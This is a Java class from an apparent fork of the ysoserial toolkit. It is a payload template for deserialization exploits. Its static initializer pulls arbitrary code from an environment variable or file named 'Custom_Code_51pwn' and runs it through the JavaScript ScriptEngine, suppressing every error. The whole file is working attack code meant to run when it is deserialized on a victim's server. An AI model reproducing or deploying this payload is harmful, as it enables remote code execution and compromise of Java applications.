package ysoserial.payloads.templates;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

public class ScriptEngineTemplate {
    static String cmd;

    static {
        String szInjecting = "Custom_Code_51pwn";
        String szEvCmd = System.getenv(szInjecting);
        if(""!=szEvCmd){
            cmd = szEvCmd;
        }
        // # 2 file
        File file = new File(szInjecting);
        if(file.exists()){
            byte[] bytes1 = new byte[(int) file.length()];
            FileInputStream fis = null;
            try{
                fis = new FileInputStream(file);
                if (0 < fis.read(bytes1)) {
                    cmd = new String(bytes1);
                }
            }catch (Exception e){}
            finally {
                if(null !=fis){
                    try {
                        fis.close();
                    } catch (Exception e) {
                    }
                }
            }
        }
        try {new javax.script.ScriptEngineManager().getEngineByName("JavaScript").eval(cmd);}catch (java.lang.Throwable e8876){}
    }
}
